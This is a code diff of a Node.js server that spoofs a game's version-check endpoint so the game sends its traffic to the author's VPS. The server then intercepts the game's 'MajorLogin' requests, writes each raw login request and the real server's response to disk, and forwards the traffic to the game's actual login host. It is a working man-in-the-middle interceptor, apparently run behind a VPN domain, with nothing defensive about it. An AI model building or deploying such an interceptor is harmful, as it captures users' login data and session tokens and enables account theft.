@@ -12,13 +12,12 @@ const HTTPS_PORT = 443;
 const MY_DOMAIN = 'navivpn.sytes.net';
 const MY_IP = '103.6.168.170';
 const MY_URL_HTTPS = `https://${MY_DOMAIN}`;
-const TARGET_HOST = 'loginbp.ggpolarbear.com'; // Real Server එක
+const TARGET_HOST = 'loginbp.ggpolarbear.com'; 
 const LOG_DIR = path.join(__dirname, 'logs');
 
-// Logs ෆෝල්ඩරය සෑදීම
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
 
-// 🔒 SSL Certificates (Let's Encrypt)
+// 🔒 SSL Certificates
 let sslOptions;
 try {
     sslOptions = {
@@ -27,11 +26,11 @@ try {
     };
     console.log('✅ SSL Certificates loaded successfully');
 } catch (err) {
-    console.error('❌ SSL Error: Make sure Let\'s Encrypt is set up correctly!');
+    console.error('❌ SSL Error:', err.message);
     process.exit(1);
 }
 
-// 📦 Raw Body Parser (Binary/Protobuf Capture සඳහා)
+// 📦 Raw Body Parser
 app.use((req, res, next) => {
     const chunks = [];
     req.on('data', chunk => chunks.push(chunk));
@@ -41,7 +40,7 @@ app.use((req, res, next) => {
     });
 });
 
-// 1️⃣ [ver.php] - ගේම් එකේ Traffic එක අපේ VPS එකට හරවන තැන
+// 1️⃣ [ver.php] - Fixed
 app.get('/ver.php', (req, res) => {
     const clientIp = req.ip.replace('::ffff:', '');
     const verData = {
@@ -61,17 +60,14 @@ app.get('/ver.php', (req, res) => {
     console.log(`✅ [ver.php] sent to ${clientIp}`);
 });
 
-// 2️⃣ [MajorLogin] - Direct Forwarding & Binary Logging
+// 2️⃣ [MajorLogin]
 app.post('/MajorLogin', (req, res) => {
     const timestamp = Date.now();
     console.log(`\n🎯 [MajorLogin] Intercepted! Size: ${req.rawBody.length} bytes`);
 
-    // ✅ STEP 1: Game එක එවන Request එක සේව් කිරීම (.bin file)
     const reqPath = path.join(LOG_DIR, `req_${timestamp}.bin`);
     fs.writeFileSync(reqPath, req.rawBody);
-    console.log(`[→] Game Request Saved: ${reqPath}`);
 
-    // ✅ STEP 2: Real Server එකට Direct Forward කිරීම
     const options = {
         hostname: TARGET_HOST,
         port: 443,
@@ -79,7 +75,7 @@ app.post('/MajorLogin', (req, res) => {
         method: 'POST',
         headers: {
             ...req.headers,
-            'host': TARGET_HOST, // Host එක අනිවාර්යයෙන්ම target එකට මාරු කරන්න ඕනේ
+            'host': TARGET_HOST,
             'content-length': req.rawBody.length
         },
         timeout: 30000
@@ -87,18 +83,11 @@ app.post('/MajorLogin', (req, res) => {
 
     const proxyReq = https.request(options, (proxyRes) => {
         const resChunks = [];
-
         proxyRes.on('data', chunk => resChunks.push(chunk));
-        
         proxyRes.on('end', () => {
             const responseBody = Buffer.concat(resChunks);
-
-            // ✅ STEP 3: Real Server එකෙන් එවන Response එක සේව් කිරීම (.bin file)
             const resPath = path.join(LOG_DIR, `res_${timestamp}.bin`);
             fs.writeFileSync(resPath, responseBody);
-            console.log(`[←] Server Response Saved: Status ${proxyRes.statusCode} | ${responseBody.length} bytes`);
-
-            // Game එකට Response එක යැවීම
             res.writeHead(proxyRes.statusCode, proxyRes.headers);
             res.end(responseBody);
             console.log(`✅ Forwarding Complete.`);
@@ -110,18 +99,18 @@ app.post('/MajorLogin', (req, res) => {
         res.status(502).send('Gateway Error');
     });
 
-    // Game එකෙන් ආපු raw body එක real server එකට ලියනවා
     proxyReq.write(req.rawBody);
     proxyReq.end();
 });
 
 // 3️⃣ [Ping & Others]
 app.post('/Ping', (req, res) => res.send("OK"));
-app.all('/*', (req, res) => res.send("OK"));
 
-// 🚀 Servers Start කිරීම
-http.createServer(app).listen(HTTP_PORT, '0.0.0.0', () => console.log(`🌐 HTTP Logger on port ${HTTP_PORT}`));
-https.createServer(sslOptions, app).listen(HTTPS_PORT, '0.0.0.0', () => console.log(`🔒 HTTPS Logger on port ${HTTPS_PORT}`));
+// ⚠️ මෙන්න මේ කෑල්ල තමයි මම fix කළේ (Wildcard fix)
+app.all('*', (req, res) => {
+    res.send("OK");
+});
 
-console.log(`\n🔥 DIRECT LOGGING SYSTEM ACTIVE (No Relay Mode)`);
-console.log(`📁 Logs Folder: ${LOG_DIR}`);
+// 🚀 Start
+http.createServer(app).listen(HTTP_PORT, '0.0.0.0', () => console.log(`🌐 HTTP on ${HTTP_PORT}`));
+https.createServer(sslOptions, app).listen(HTTPS_PORT, '0.0.0.0', () => console.log(`🔒 HTTPS on ${HTTPS_PORT}`));
